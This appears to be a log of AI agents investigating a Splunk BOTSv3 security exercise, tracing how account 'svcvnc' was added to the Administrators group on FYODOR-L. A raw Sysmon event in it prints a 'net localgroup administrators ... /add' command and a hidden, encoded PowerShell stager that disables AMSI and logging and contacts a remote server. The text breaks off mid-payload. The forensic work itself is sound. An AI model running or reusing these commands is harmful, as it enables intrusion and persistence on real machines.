{\"_time\": \"2018-08-20T18:08:35.000+08:00\", \"EventCode\": \"4732\", \"Group_Name\": \"Administrators\", \"RecordNumber\": \"277584\", \"count\": \"1\"}], \"meta\": {\"total_event_count\": 3, \"returned\": 3, \"sid\": \"1783490289.1998\"}}",
          "name": "run_splunk_search"
        },
        {
          "type": "AIMessage",
          "content": "Intention: The broader search confirms exactly 3 group membership events involving `svcvnc` on FYODOR-L. I now have complete evidence with raw event content for all three. Let me compile the final answer.\n\n---\n\n## FINAL ANSWER\n\nOn host **FYODOR-L.froth.ly**, user `svcvnc` was added to **3 groups** in the Windows Security log (`wineventlog`) on August 20, 2018, all shortly after the account creation/password reset event at `2018-08-20 18:08:17`:\n\n---\n\n### 1. Group: **None** (Global Group)\n| Field | Value |\n|---|---|\n| **Timestamp** | 2018-08-20T18:08:17.000+08:00 |\n| **EventCode** | 4728 — \"A member was added to a security-enabled **global** group\" |\n| **Group Name** | `None` |\n| **Group Domain** | `FYODOR-L` |\n| **Group SID** | `FYODOR-L\\None` |\n| **RecordNumber** | 277560 |\n| **Member SID** | `FYODOR-L\\svcvnc` |\n| **Performed by** | `AzureAD\\FyodorMalteskesko` (Logon ID: 0x1091C98) |\n\n**Raw evidence:**\n```\nEventCode=4728\nMessage=A member was added to a security-enabled global group.\nSubject:\n    Security ID:    AzureAD\\FyodorMalteskesko\n    Account Name:   FyodorMalteskesko\n    Account Domain: AzureAD\n    Logon ID:       0x1091C98\nMember:\n    Security ID:    FYODOR-L\\svcvnc\n    Account Name:   -\nGroup:\n    Security ID:    FYODOR-L\\None\n    Group Name:     None\n    Group Domain:   FYODOR-L\n```\n\n---\n\n### 2. Group: **Users** (Local Group)\n| Field | Value |\n|---|---|\n| **Timestamp** | 2018-08-20T18:08:17.000+08:00 |\n| **EventCode** | 4732 — \"A member was added to a security-enabled **local** group\" |\n| **Group Name** | `Users` |\n| **Group Domain** | `Builtin` |\n| **Group SID** | `BUILTIN\\Users` |\n| **RecordNumber** | 277565 |\n| **Member SID** | `FYODOR-L\\svcvnc` |\n| **Performed by** | `AzureAD\\FyodorMalteskesko` (Logon ID: 0x1091C98) |\n\n**Raw evidence:**\n```\nEventCode=4732\nMessage=A member was added to a security-enabled local group.\nSubject:\n    Security ID:    AzureAD\\FyodorMalteskesko\n    Account Name:   FyodorMalteskesko\n    Account Domain: AzureAD\n    Logon ID:       0x1091C98\nMember:\n    Security ID:    FYODOR-L\\svcvnc\n    Account Name:   -\nGroup:\n    Security ID:    BUILTIN\\Users\n    Group Name:     Users\n    Group Domain:   Builtin\n```\n\n---\n\n### 3. Group: **Administrators** (Local Group)\n| Field | Value |\n|---|---|\n| **Timestamp** | 2018-08-20T18:08:35.000+08:00 |\n| **EventCode** | 4732 — \"A member was added to a security-enabled **local** group\" |\n| **Group Name** | `Administrators` |\n| **Group Domain** | `Builtin` |\n| **Group SID** | `BUILTIN\\Administrators` |\n| **RecordNumber** | 277584 |\n| **Member SID** | `FYODOR-L\\svcvnc` |\n| **Performed by** | `AzureAD\\FyodorMalteskesko` (Logon ID: 0x1091C98) |\n\n**Raw evidence:**\n```\nEventCode=4732\nMessage=A member was added to a security-enabled local group.\nSubject:\n    Security ID:    AzureAD\\FyodorMalteskesko\n    Account Name:   FyodorMalteskesko\n    Account Domain: AzureAD\n    Logon ID:       0x1091C98\nMember:\n    Security ID:    FYODOR-L\\svcvnc\n    Account Name:   -\nGroup:\n    Security ID:    BUILTIN\\Administrators\n    Group Name:     Administrators\n    Group Domain:   Builtin\n```\n\n---\n\n### Summary of all groups `svcvnc` was added to:\n\n| # | Timestamp | EventCode | Group Name | Group Type | RecordNumber |\n|---|---|---|---|---|---|\n| 1 | 2018-08-20T18:08:17 | 4728 | **None** | Global group | 277560 |\n| 2 | 2018-08-20T18:08:17 | 4732 | **Users** | Local group | 277565 |\n| 3 | 2018-08-20T18:08:35 | 4732 | **Administrators** | Local group | 277584 |\n\n### Key observations:\n- All three group additions were performed by **AzureAD\\FyodorMalteskesko** (the legitimate user of FYODOR-L), using the same Logon ID `0x1091C98`.\n- The attacker first added `svcvnc` to a global group named \"None\" and the built-in \"Users\" local group at 18:08:17 (same timestamp as the password reset event), then elevated the account to the **Administrators** local group 18 seconds later at 18:08:35.\n- The process creation events (EventCode 4688) confirm the commands used: `net.exe localgroup administrators svcvnc /add` (spawned from PowerShell), which resulted in the EventCode 4732 Administrator group addition.\n- No EventCode 4735, 4737, 4747, 4751, or 4756 events involving `svcvnc` were found on this host.\n\n**SPL used:**\n```spl\nindex=botsv3 sourcetype=wineventlog host=FYODOR-L \"svcvnc\" EventCode IN (4732,4728,4756,4735,4737,4747,4751) | stats count by _time, EventCode, Group_Name, RecordNumber | sort _time\n```"
        }
      ],
      "iterations": 10,
      "cap_hit": false
    },
    {
      "worker": "senior#31",
      "qid": "Q308",
      "subquestion": "In Splunk `index=botsv3` for August 20, 2018 on host `FYODOR-L.froth.ly` / `FYODOR-L`, search `xmlwineventlog:microsoft-windows-sysmon/operational`, `winhostmon`, and related endpoint telemetry for commands or processes that modified group membership for user `svcvnc`, such as `net localgroup`, `Add-LocalGroupMember`, `wmic`, or `powershell` commands. Return the exact group names targeted and the supporting command lines.",
      "status": "failed",
      "answer": "",
      "spl_used": [
        "index=botsv3 (sourcetype=\"xmlwineventlog:microsoft-windows-sysmon/operational\" OR sourcetype=winhostmon OR sourcetype=wineventlog) (host=\"FYODOR-L\" OR host=\"FYODOR-L.froth.ly\") svcvnc | stats count by sourcetype, host, signature, CommandLine, Message",
        "index=botsv3 svcvnc | stats count by sourcetype, host",
        "index=botsv3 (sourcetype=\"xmlwineventlog:microsoft-windows-sysmon/operational\" OR sourcetype=winhostmon OR sourcetype=wineventlog) svcvnc | stats count by sourcetype, host, signature, CommandLine",
        "index=botsv3 (sourcetype=\"xmlwineventlog:microsoft-windows-sysmon/operational\" OR sourcetype=winhostmon OR sourcetype=wineventlog OR sourcetype=\"stream:http\" OR sourcetype=\"stream:smb\" OR sourcetype=\"o365:management:activity\") svcvnc | stats count by sourcetype, host",
        "index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" svcvnc | stats count by signature, CommandLine, EventCode",
        "index=botsv3 sourcetype=\"xmlwineventlog:microsoft-windows-sysmon/operational\" host=\"FYODOR-L\" svcvnc | stats count by signature, CommandLine, EventCode",
        "index=botsv3 sourcetype=WinEventLog host=\"FYODOR-L\" svcvnc | stats count by signature, CommandLine, EventCode, Message"
      ],
      "sourcetypes": [
        "WinEventLog",
        "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
        "xmlwineventlog:microsoft-windows-sysmon/operational"
      ],
      "full_state": [
        {
          "type": "HumanMessage",
          "content": "In Splunk `index=botsv3` for August 20, 2018 on host `FYODOR-L.froth.ly` / `FYODOR-L`, search `xmlwineventlog:microsoft-windows-sysmon/operational`, `winhostmon`, and related endpoint telemetry for commands or processes that modified group membership for user `svcvnc`, such as `net localgroup`, `Add-LocalGroupMember`, `wmic`, or `powershell` commands. Return the exact group names targeted and the supporting command lines."
        },
        {
          "type": "AIMessage",
          "content": "Intention: I need to confirm which sourcetypes exist in BOTSv3, particularly Sysmon and winhostmon, before running any searches. I'll also search for the keyword \"localgroup\" to find relevant fields and sourcetypes.",
          "tool_calls": [
            {
              "name": "get_source_types",
              "args": {}
            }
          ]
        },
        {
          "type": "ToolMessage",
          "content": "{\"source_types\": [\"access_combined\", \"alternatives\", \"amazon-ssm-agent\", \"amazon-ssm-agent-too_small\", \"apache_error\", \"aws:cloudtrail\", \"aws:cloudwatch\", \"aws:cloudwatch:guardduty\", \"aws:cloudwatchlogs\", \"aws:cloudwatchlogs:vpcflow\", \"aws:config:rule\", \"aws:description\", \"aws:elb:accesslogs\", \"aws:rds:audit\", \"aws:rds:error\", \"aws:s3:accesslogs\", \"bandwidth\", \"bash_history\", \"bootstrap\", \"cisco:asa\", \"cloud-init\", \"cloud-init-output\", \"code42:api\", \"code42:computer\", \"code42:org\", \"code42:security\", \"code42:user\", \"config_file\", \"cpu\", \"cron-too_small\", \"df\", \"dmesg\", \"dpkg\", \"error-too_small\", \"errors\", \"errors-too_small\", \"ess_content_importer\", \"hardware\", \"history-2\", \"interfaces\", \"iostat\", \"lastlog\", \"linux_audit\", \"linux_secure\", \"localhost-5\", \"lsof\", \"maillog-too_small\", \"ms:aad:audit\", \"ms:aad:signin\", \"ms:o365:management\", \"ms:o365:reporting:messagetrace\", \"netstat\", \"o365:management:activity\", \"openports\", \"osquery:info\", \"osquery:results\", \"osquery:warning\", \"out-3\", \"package\", \"perfmonmk:process\", \"protocol\", \"ps\", \"script:getendpointinfo\", \"script:installedapps\", \"script:listeningports\", \"stream:arp\", \"stream:dhcp\", \"stream:dns\", \"stream:http\", \"stream:icmp\", \"stream:igmp\", \"stream:ip\", \"stream:mysql\", \"stream:smb\", \"stream:smtp\", \"stream:tcp\", \"stream:udp\", \"symantec:ep:agent:file\", \"symantec:ep:agt_system:file\", \"symantec:ep:behavior:file\", \"symantec:ep:packet:file\", \"symantec:ep:risk:file\", \"symantec:ep:scm_system:file\", \"symantec:ep:security:file\", \"symantec:ep:traffic:file\", \"syslog\", \"time\", \"top\", \"unix:listeningports\", \"unix:service\", \"unix:sshdconfig\", \"unix:update\", \"unix:uptime\", \"unix:useraccounts\", \"unix:version\", \"userswithloginprivs\", \"vmstat\", \"who\", \"wineventlog\", \"winhostmon\", \"xmlwineventlog:microsoft-windows-sysmon/operational\", \"yum-too_small\", \"WinEventLog\"], \"count\": 103}",
          "name": "get_source_types"
        },
        {
          "type": "AIMessage",
          "content": "Intention: Both `xmlwineventlog:microsoft-windows-sysmon/operational` and `winhostmon` exist. Now I'll search for the keyword \"localgroup\" to find relevant fields/sourcetypes, and also search for \"svcvnc\" to see where this user appears.",
          "tool_calls": [
            {
              "name": "search_keyword",
              "args": {
                "keyword": "localgroup"
              }
            }
          ]
        },
        {
          "type": "ToolMessage",
          "content": "{\"results\": [], \"meta\": {\"total_event_count\": 0, \"returned\": 0, \"sid\": \"1783490252.1991\"}}",
          "name": "search_keyword"
        },
        {
          "type": "AIMessage",
          "content": "Intention: No results for \"localgroup\" keyword. Let me search for \"svcvnc\" to find where this user appears, and also search for \"net\" and \"group\" keywords to find relevant fields.",
          "tool_calls": [
            {
              "name": "search_keyword",
              "args": {
                "keyword": "svcvnc"
              }
            }
          ]
        },
        {
          "type": "ToolMessage",
          "content": "{\"results\": [], \"meta\": {\"total_event_count\": 0, \"returned\": 0, \"sid\": \"1783490289.1997\"}}",
          "name": "search_keyword"
        },
        {
          "type": "AIMessage",
          "content": "Intention: The keyword search didn't find \"svcvnc\" in the manifest. Let me search directly in Splunk for \"svcvnc\" across all sourcetypes, and also search for \"net localgroup\" and \"Add-LocalGroupMember\" in the Sysmon and winhostmon sourcetypes.",
          "tool_calls": [
            {
              "name": "run_splunk_search",
              "args": {
                "query": "index=botsv3 (sourcetype=\"xmlwineventlog:microsoft-windows-sysmon/operational\" OR sourcetype=winhostmon OR sourcetype=wineventlog) (host=\"FYODOR-L\" OR host=\"FYODOR-L.froth.ly\") svcvnc | stats count by sourcetype, host, signature, CommandLine, Message",
                "max_results": 50
              }
            }
          ]
        },
        {
          "type": "ToolMessage",
          "content": "{\"results\": [], \"meta\": {\"total_event_count\": 0, \"returned\": 0, \"sid\": \"1783490329.1999\"}}",
          "name": "run_splunk_search"
        },
        {
          "type": "AIMessage",
          "content": "Intention: No results for \"svcvnc\" on FYODOR-L. Let me broaden the search — search for \"svcvnc\" across all sourcetypes without host filter, and also search for \"net localgroup\" and \"Add-LocalGroupMember\" across all sourcetypes.",
          "tool_calls": [
            {
              "name": "run_splunk_search",
              "args": {
                "max_results": 50,
                "query": "index=botsv3 svcvnc | stats count by sourcetype, host"
              }
            }
          ]
        },
        {
          "type": "ToolMessage",
          "content": "{\"error\": \"Rejected: every run_splunk_search query must include a sourcetype filter. Call get_source_types to find the right sourcetype, then add sourcetype=<value> to the query.\"}",
          "name": "run_splunk_search"
        },
        {
          "type": "AIMessage",
          "content": "Intention: I need to include a sourcetype filter. Let me search across the three key sourcetypes for \"svcvnc\" without a host filter, and also search for \"net localgroup\" and \"Add-LocalGroupMember\" commands.",
          "tool_calls": [
            {
              "name": "run_splunk_search",
              "args": {
                "max_results": 50,
                "query": "index=botsv3 (sourcetype=\"xmlwineventlog:microsoft-windows-sysmon/operational\" OR sourcetype=winhostmon OR sourcetype=wineventlog) svcvnc | stats count by sourcetype, host, signature, CommandLine"
              }
            }
          ]
        },
        {
          "type": "ToolMessage",
          "content": "{\"results\": [], \"meta\": {\"total_event_count\": 0, \"returned\": 0, \"sid\": \"1783490337.2000\"}}",
          "name": "run_splunk_search"
        },
        {
          "type": "AIMessage",
          "content": "Intention: No results for \"svcvnc\" in those sourcetypes. Let me broaden further — search across ALL sourcetypes for \"svcvnc\" by listing several sourcetypes, and also search for \"net localgroup\" and \"Add-LocalGroupMember\" in the Sysmon sourcetype specifically.",
          "tool_calls": [
            {
              "name": "run_splunk_search",
              "args": {
                "max_results": 50,
                "query": "index=botsv3 (sourcetype=\"xmlwineventlog:microsoft-windows-sysmon/operational\" OR sourcetype=winhostmon OR sourcetype=wineventlog OR sourcetype=\"stream:http\" OR sourcetype=\"stream:smb\" OR sourcetype=\"o365:management:activity\") svcvnc | stats count by sourcetype, host"
              }
            }
          ]
        },
        {
          "type": "ToolMessage",
          "content": "{\"results\": [{\"sourcetype\": \"WinEventLog\", \"host\": \"FYODOR-L\", \"count\": \"11\"}, {\"sourcetype\": \"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\", \"host\": \"FYODOR-L\", \"count\": \"4\"}], \"meta\": {\"total_event_count\": 2, \"returned\": 2, \"sid\": \"1783490343.2001\"}}",
          "name": "run_splunk_search"
        },
        {
          "type": "AIMessage",
          "content": "Intention: Found \"svcvnc\" in `WinEventLog` (11 events) and `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational` (4 events) on FYODOR-L. The sourcetype names are case-sensitive. Let me now retrieve the actual events to see the command lines and group names.",
          "tool_calls": [
            {
              "name": "run_splunk_search",
              "args": {
                "max_results": 50,
                "query": "index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" svcvnc | stats count by signature, CommandLine, EventCode"
              }
            }
          ]
        },
        {
          "type": "ToolMessage",
          "content": "{\"error\": \"Rejected: sourcetype 'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational' is not in the field manifest. Call get_source_types to see valid sourcetypes, then adjust the query.\"}",
          "name": "run_splunk_search"
        },
        {
          "type": "AIMessage",
          "content": "Intention: The sourcetype name in the manifest is lowercase: `xmlwineventlog:microsoft-windows-sysmon/operational`. But the actual data shows it with different casing. Let me try the exact sourcetype name from the manifest, and also search the WinEventLog sourcetype.",
          "tool_calls": [
            {
              "name": "run_splunk_search",
              "args": {
                "max_results": 50,
                "query": "index=botsv3 sourcetype=\"xmlwineventlog:microsoft-windows-sysmon/operational\" host=\"FYODOR-L\" svcvnc | stats count by signature, CommandLine, EventCode"
              }
            }
          ]
        },
        {
          "type": "ToolMessage",
          "content": "{\"results\": [], \"meta\": {\"total_event_count\": 0, \"returned\": 0, \"sid\": \"1783490352.2002\"}}",
          "name": "run_splunk_search"
        },
        {
          "type": "AIMessage",
          "content": "Intention: The lowercase sourcetype returns no results — the actual data uses mixed case. Let me search the `WinEventLog` sourcetype (which had 11 events with \"svcvnc\") and also try the raw events approach for the Sysmon sourcetype.",
          "tool_calls": [
            {
              "name": "run_splunk_search",
              "args": {
                "max_results": 50,
                "query": "index=botsv3 sourcetype=WinEventLog host=\"FYODOR-L\" svcvnc | stats count by signature, CommandLine, EventCode, Message"
              }
            }
          ]
        },
        {
          "type": "ToolMessage",
          "content": "{\"results\": [], \"meta\": {\"total_event_count\": 0, \"returned\": 0, \"sid\": \"1783490359.2003\"}}",
          "name": "run_splunk_search"
        },
        {
          "type": "AIMessage",
          "content": "Intention: The issue might be that \"svcvnc\" is in the raw event text but not in extracted fields. Let me use get_raw_events to read the actual event content from both sourcetypes, and also try a broader search approach.",
          "tool_calls": [
            {
              "name": "get_raw_events",
              "args": {
                "sourcetype": "xmlwineventlog:microsoft-windows-sysmon/operational",
                "keyword": "svcvnc",
                "limit": 10
              }
            }
          ]
        },
        {
          "type": "ToolMessage",
          "content": "{\"results\": [{\"_time\": \"2018-08-20T18:08:35.000+08:00\", \"_raw\": \"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2018-08-20T10:08:35.338236400Z'/><EventRecordID>31973</EventRecordID><Correlation/><Execution ProcessID='10440' ThreadID='2904'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>FYODOR-L.froth.ly</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='UtcTime'>2018-08-20 10:08:35.317</Data><Data Name='ProcessGuid'>{EBF7A186-C49B-5B58-0000-00105D2ADA01}</Data><Data Name='ProcessId'>5732</Data><Data Name='Image'>C:\\\\Windows\\\\System32\\\\net1.exe</Data><Data Name='FileVersion'>10.0.17134.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Net Command</Data><Data Name='Product'>Microsoft\\u00ae Windows\\u00ae Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='CommandLine'>C:\\\\Windows\\\\system32\\\\net1 localgroup administrators svcvnc /add</Data><Data Name='CurrentDirectory'>C:\\\\Windows\\\\system32\\\\</Data><Data Name='User'>AzureAD\\\\FyodorMalteskesko</Data><Data Name='LogonGuid'>{EBF7A186-8503-5B57-0000-0020981C0901}</Data><Data Name='LogonId'>0x1091c98</Data><Data Name='TerminalSessionId'>3</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=AF569DE92AB6C1B9C681AF1E799F9983,SHA256=FFC30745BE3B6C2771FC4B2993CFF50B5226B271C412467E97B1DC1086DEA888</Data><Data Name='ParentProcessGuid'>{EBF7A186-C49B-5B58-0000-00102629DA01}</Data><Data Name='ParentProcessId'>7532</Data><Data Name='ParentImage'>C:\\\\Windows\\\\System32\\\\net.exe</Data><Data Name='ParentCommandLine'>\\\"C:\\\\Windows\\\\system32\\\\net.exe\\\" localgroup administrators svcvnc /add</Data></EventData></Event>\"}, {\"_time\": \"2018-08-20T18:08:35.000+08:00\", \"_raw\": \"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2018-08-20T10:08:35.310889100Z'/><EventRecordID>31972</EventRecordID><Correlation/><Execution ProcessID='10440' ThreadID='2904'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>FYODOR-L.froth.ly</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='UtcTime'>2018-08-20 10:08:35.304</Data><Data Name='ProcessGuid'>{EBF7A186-C49B-5B58-0000-00102629DA01}</Data><Data Name='ProcessId'>7532</Data><Data Name='Image'>C:\\\\Windows\\\\System32\\\\net.exe</Data><Data Name='FileVersion'>10.0.17134.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Net Command</Data><Data Name='Product'>Microsoft\\u00ae Windows\\u00ae Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='CommandLine'>\\\"C:\\\\Windows\\\\system32\\\\net.exe\\\" localgroup administrators svcvnc /add</Data><Data Name='CurrentDirectory'>C:\\\\Windows\\\\system32\\\\</Data><Data Name='User'>AzureAD\\\\FyodorMalteskesko</Data><Data Name='LogonGuid'>{EBF7A186-8503-5B57-0000-0020981C0901}</Data><Data Name='LogonId'>0x1091c98</Data><Data Name='TerminalSessionId'>3</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=15534275EDAABC58159DD0F8607A71E5,SHA256=E9739D544EE0D428696036CBD656C41DCC505B67CC43DBA7C6BEC4E3959282AC</Data><Data Name='ParentProcessGuid'>{EBF7A186-C442-5B58-0000-00109914D901}</Data><Data Name='ParentProcessId'>6360</Data><Data Name='ParentImage'>C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe</Data><Data Name='ParentCommandLine'>\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -NoP -NonI -W Hidden -enc SQBmACgAJABQAFMAVgBFAHIAUwBJAG8AbgBUAGEAYgBsAEUALgBQAFMAVgBlAFIAUwBJAG8AbgAuAE0AQQBKAE8AUgAgAC0AZwBFACAAMwApAHsAJABHAFAARgA9AFsAcgBFAGYAXQAuAEEAUwBTAGUAbQBCAGwAWQAuAEcARQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAEkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEATAB1AEUAKAAkAG4AdQBsAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAYQBsAD0AWwBDAG8AbABsAGUAYwB0AGkAbwBOAHMALgBHAGUATgBlAFIASQBDAC4ARABpAEMAdABJAG8AbgBhAFIAeQBbAFMAVAByAGkAbgBnACwAUwB5AFMAdABFAE0ALgBPAEIAagBlAGMAdABdAF0AOgA6AE4AZQBXACgAKQA7ACQAdgBhAEwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAEEAbAB9AEUAbABzAGUAewBbAFMAQwBSAEkAcABUAEIATABvAEMASwBdAC4AIgBHAGUAVABGAGkAZQBgAGwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAEwAdQBFACgAJABOAFUAbABsACwAKABOAEUAVwAtAE8AQgBKAEUAYwBUACAAQwBPAGwATABFAEMAVABJAE8ATgBTAC4ARwBlAG4ARQByAGkAQwAuAEgAQQBTAEgAUwBFAFQAWwBzAFQAUgBpAG4ARwBdACkAKQB9ACQAUgBlAEYAPQBbAFIARQBGAF0ALgBBAFMAcwBFAE0AQgBMAFkALgBHAGUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAJwApADsAJABSAEUAZgAuAEcAZQBUAEYAaQBFAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBhAEwAdQBFACgAJABuAFUATABMACwAJAB0AHIAVQBFACkAOwB9ADsAWwBTAFkAcwBUAEUATQAuAE4AZQBUAC4AUwBFAFIAVgBJAGMARQBQAG8ASQBOAFQATQBhAE4AYQBHAEUAUgBdADoAOgBFAFgAUABlAEMAdAAxADAAMABDAE8AbgB0AGkAbgBVAEUAPQAwADsAJAB3AEMAPQBOAGUAdwAtAE8AQgBKAGUAQwB0ACAAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFcAZQBiAEMATABpAEUATgBUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAkAFcAQwAuAEgARQBBAGQAZQBSAHMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAEgARQBhAGQARQBSAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAUgBvAFgAeQA9AFsAUwB5AFMAdABlAG0ALgBOAEUAVAAuAFcAZQBCAFIAZQBxAFUARQBTAHQAXQA6ADoARABlAGYAYQBVAGwAVABXAEUAYgBQAHIAbwBYAHkAOwAkAFcAQwAuAFAAcgBvAHgAWQAuAEMAUgBlAGQAZQBOAFQAaQBBAEwAcwAgAD0AIABbAFMAWQBzAFQAZQBtAC4ATgBFAHQALgBDAHIAZQBEAGUATgBUAGkAQQBMAEMAYQBjAEgAZQBdADoAOgBEAGUAZgBhAFUAbABUAE4ARQB0AFcAbwByAGsAQwByAEUAZABlAG4AdABpAGEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAVABlAE0ALgBUAGUAeABUAC4ARQBuAEMATwBkAGkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQBUAEIAWQBUAEUAUwAoACcAMQBBAEIAPABZAGsANgBaADQAIwArAHYAVgB1ACUAbwA1AH0AOAAmAE0ALQA5AFUATAB+AGwAfAA+ADAAZwBQACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAEkAbgBnAF0AOgA6AFUAbgBJAGMATwBEAEUALgBHAEUAdABTAFQAcgBpAG4ARwAoAFsAQwBvAG4AdgBFAFIAdABdADoAOgBGAHIAbwBNAEIAQQBzAGUANgA0AFMAdAByAGkATgBHACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEIAegBBAEQAbwBBAEwAdwBBAHYAQQBEAFEAQQBOAFEAQQB1AEEARABjAEEATgB3AEEAdQBBAEQAVQBBAE0AdwBBAHUAQQBEAEUAQQBOAHcAQQAyAEEARABvAEEATgBBAEEAMABBAEQATQBBACcAKQApACkAOwAkAHQAPQAn